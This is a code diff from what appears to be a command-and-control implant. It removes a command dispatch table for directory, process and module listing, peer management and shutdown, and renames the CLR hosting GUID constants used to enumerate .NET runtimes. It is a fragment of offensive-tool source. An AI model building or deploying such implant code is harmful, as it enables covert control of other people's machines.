@@ -1,14 +1,5 @@
 #include <core/include/commands.hpp>
 namespace Commands {
-    _code_seg(".rdata") _command_map cmd_map[] = {
-        { .name = DIRECTORYLIST,    .address = DirectoryList    },
-        { .name = PROCESSMODULES,   .address = ProcessModules   },
-        { .name = PROCESSLIST,      .address = ProcessList      },
-        { .name = ADDPEER,          .address = AddPeer          },
-        { .name = REMOVEPEER,       .address = RemovePeer       },
-        { .name = SHUTDOWN,         .address = Shutdown         },
-        { .name = 0,                .address = nullptr          }
-    };
 
     VOID DirectoryList (_parser *const parser) {
         HEXANE
@@ -187,7 +178,7 @@ namespace Commands {
                 continue;
             }
 
-            if (SUCCEEDED(Ctx->clr.CLRCreateInstance(GUID_CLSID_CLRMetaHost, GUID_IID_ICLRMetaHost, R_CAST(void**, &meta)))) {
+            if (SUCCEEDED(Ctx->clr.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, R_CAST(void**, &meta)))) {
                 if (SUCCEEDED(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums))) {
 
                     while (S_OK == enums->Next(0x1, R_CAST(IUnknown**, &runtime), nullptr)) {
